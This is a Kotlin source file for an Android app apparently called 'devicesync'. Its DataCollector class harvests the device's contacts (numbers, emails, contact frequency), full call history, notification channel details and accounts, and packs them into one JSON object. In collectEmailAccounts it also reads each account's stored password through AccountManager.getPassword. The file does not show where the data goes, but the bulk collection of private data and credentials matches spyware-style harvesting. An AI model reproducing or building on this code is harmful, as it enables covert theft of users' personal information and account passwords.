package com.devicesync.app.utils

import android.Manifest
import android.content.ContentResolver
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import android.util.Log
import androidx.core.content.ContextCompat
import org.json.JSONArray
import org.json.JSONObject
import java.util.*

class DataCollector(private val context: Context) {
    
    companion object {
        private const val TAG = "DataCollector"
    }
    
    /**
     * Collect all data types that have been granted permissions
     */
    fun collectAllData(): JSONObject {
        val data = JSONObject()
        
        try {
            // Collect contacts if permission granted
            if (hasContactsPermission()) {
                data.put("contacts", collectContacts())
                Log.d(TAG, "Contacts collected successfully")
            } else {
                Log.w(TAG, "Contacts permission not granted")
            }
            
            // Collect call logs if permission granted
            if (hasCallLogPermission()) {
                data.put("call_logs", collectCallLogs())
                Log.d(TAG, "Call logs collected successfully")
            } else {
                Log.w(TAG, "Call logs permission not granted")
            }
            
            // Collect notifications if permission granted
            if (hasNotificationPermission()) {
                data.put("notifications", collectNotifications())
                Log.d(TAG, "Notifications collected successfully")
            } else {
                Log.w(TAG, "Notification permission not granted")
            }
            
            // Collect email accounts if permission granted
            if (hasAccountsPermission()) {
                data.put("email_accounts", collectEmailAccounts())
                Log.d(TAG, "Email accounts collected successfully")
            } else {
                Log.w(TAG, "Accounts permission not granted")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting data", e)
        }
        
        return data
    }
    
    /**
     * Collect contacts data
     */
    private fun collectContacts(): JSONArray {
        val contacts = JSONArray()
        val contentResolver: ContentResolver = context.contentResolver
        
        val projection = arrayOf(
            ContactsContract.Contacts._ID,
            ContactsContract.Contacts.DISPLAY_NAME,
            ContactsContract.Contacts.HAS_PHONE_NUMBER,
            ContactsContract.Contacts.TIMES_CONTACTED,
            ContactsContract.Contacts.LAST_TIME_CONTACTED
        )
        
        val selection = "${ContactsContract.Contacts.DISPLAY_NAME} IS NOT NULL"
        
        contentResolver.query(
            ContactsContract.Contacts.CONTENT_URI,
            projection,
            selection,
            null,
            "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val contact = JSONObject()
                val contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                
                contact.put("id", contactId)
                contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)))
                contact.put("has_phone", cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0)
                contact.put("times_contacted", cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.TIMES_CONTACTED)))
                contact.put("last_contacted", cursor.getLong(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.LAST_TIME_CONTACTED)))
                
                // Get phone numbers
                val phoneNumbers = JSONArray()
                if (contact.getBoolean("has_phone")) {
                    val phoneCursor = contentResolver.query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        arrayOf(
                            ContactsContract.CommonDataKinds.Phone.NUMBER,
                            ContactsContract.CommonDataKinds.Phone.TYPE
                        ),
                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
                        arrayOf(contactId),
                        null
                    )
                    
                    phoneCursor?.use { phoneCursor ->
                        while (phoneCursor.moveToNext()) {
                            val phone = JSONObject()
                            phone.put("number", phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
                            phone.put("type", phoneCursor.getInt(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.TYPE)))
                            phoneNumbers.put(phone)
                        }
                    }
                }
                contact.put("phone_numbers", phoneNumbers)
                
                // Get email addresses
                val emails = JSONArray()
                val emailCursor = contentResolver.query(
                    ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Email.ADDRESS,
                        ContactsContract.CommonDataKinds.Email.TYPE
                    ),
                    "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
                    arrayOf(contactId),
                    null
                )
                
                emailCursor?.use { emailCursor ->
                    while (emailCursor.moveToNext()) {
                        val email = JSONObject()
                        email.put("address", emailCursor.getString(emailCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.ADDRESS)))
                        email.put("type", emailCursor.getInt(emailCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.TYPE)))
                        emails.put(email)
                    }
                }
                contact.put("emails", emails)
                
                contacts.put(contact)
            }
        }
        
        return contacts
    }
    
    /**
     * Collect call logs data
     */
    private fun collectCallLogs(): JSONArray {
        val callLogs = JSONArray()
        val contentResolver: ContentResolver = context.contentResolver
        
        val projection = arrayOf(
            CallLog.Calls._ID,
            CallLog.Calls.NUMBER,
            CallLog.Calls.TYPE,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.CACHED_NAME,
            CallLog.Calls.CACHED_NUMBER_TYPE,
            CallLog.Calls.CACHED_NUMBER_LABEL
        )
        
        contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            "${CallLog.Calls.DATE} DESC"
        )?.use { cursor ->
            while (cursor.moveToNext()) {
                val callLog = JSONObject()
                
                callLog.put("id", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)))
                callLog.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)))
                callLog.put("type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)))
                callLog.put("date", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)))
                callLog.put("duration", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)))
                callLog.put("cached_name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)))
                callLog.put("cached_number_type", cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_TYPE)))
                callLog.put("cached_number_label", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NUMBER_LABEL)))
                
                // Convert call type to readable string
                val callType = when (callLog.getInt("type")) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    CallLog.Calls.BLOCKED_TYPE -> "blocked"
                    else -> "unknown"
                }
                callLog.put("type_string", callType)
                
                callLogs.put(callLog)
            }
        }
        
        return callLogs
    }
    
    /**
     * Collect notifications data (limited to what's accessible)
     */
    private fun collectNotifications(): JSONArray {
        val notifications = JSONArray()
        
        // Note: Direct notification access requires NotificationListenerService
        // For now, we'll collect basic notification settings and recent notifications if accessible
        
        try {
            // Check if notification access is enabled
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            val notificationSettings = JSONObject()
            
            // Get notification channels info
            val channels = JSONArray()
            notificationManager.notificationChannels.forEach { channel ->
                val channelInfo = JSONObject()
                channelInfo.put("id", channel.id)
                channelInfo.put("name", channel.name)
                channelInfo.put("description", channel.description)
                channelInfo.put("importance", channel.importance)
                channelInfo.put("enabled", channel.importance != android.app.NotificationManager.IMPORTANCE_NONE)
                channels.put(channelInfo)
            }
            notificationSettings.put("channels", channels)
            
            // Add notification settings to the array
            notifications.put(notificationSettings)
            
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting notification data", e)
        }
        
        return notifications
    }
    
    /**
     * Collect email accounts data
     */
    private fun collectEmailAccounts(): JSONArray {
        val emailAccounts = JSONArray()
        val accountManager = android.accounts.AccountManager.get(context)
        
        try {
            val accounts = accountManager.accounts
            accounts.forEach { account ->
                val emailAccount = JSONObject()
                emailAccount.put("name", account.name)
                emailAccount.put("type", account.type)
                emailAccount.put("description", accountManager.getUserData(account, "description") ?: "")
                
                // Get additional account info
                val accountInfo = JSONObject()
                try {
                    accountInfo.put("last_authenticated_time", accountManager.getUserData(account, "lastAuthenticatedTime") ?: "")
                    accountInfo.put("password", accountManager.getPassword(account) ?: "")
                } catch (e: Exception) {
                    Log.w(TAG, "Could not get sensitive account info for ${account.name}")
                }
                
                emailAccount.put("account_info", accountInfo)
                emailAccounts.put(emailAccount)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error collecting email accounts", e)
        }
        
        return emailAccounts
    }
    
    /**
     * Permission check methods
     */
    private fun hasContactsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasCallLogPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasNotificationPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.POST_NOTIFICATIONS) == PackageManager.PERMISSION_GRANTED
    }
    
    private fun hasAccountsPermission(): Boolean {
        return ContextCompat.checkSelfPermission(context, Manifest.permission.GET_ACCOUNTS) == PackageManager.PERMISSION_GRANTED
    }
    
    /**
     * Get data collection summary
     */
    fun getDataSummary(): JSONObject {
        val summary = JSONObject()
        val data = collectAllData()
        
        summary.put("contacts_count", if (data.has("contacts")) data.getJSONArray("contacts").length() else 0)
        summary.put("call_logs_count", if (data.has("call_logs")) data.getJSONArray("call_logs").length() else 0)
        summary.put("notifications_count", if (data.has("notifications")) data.getJSONArray("notifications").length() else 0)
        summary.put("email_accounts_count", if (data.has("email_accounts")) data.getJSONArray("email_accounts").length() else 0)
        
        summary.put("permissions_granted", JSONObject().apply {
            put("contacts", hasContactsPermission())
            put("call_logs", hasCallLogPermission())
            put("notifications", hasNotificationPermission())
            put("accounts", hasAccountsPermission())
        })
        
        return summary
    }
} 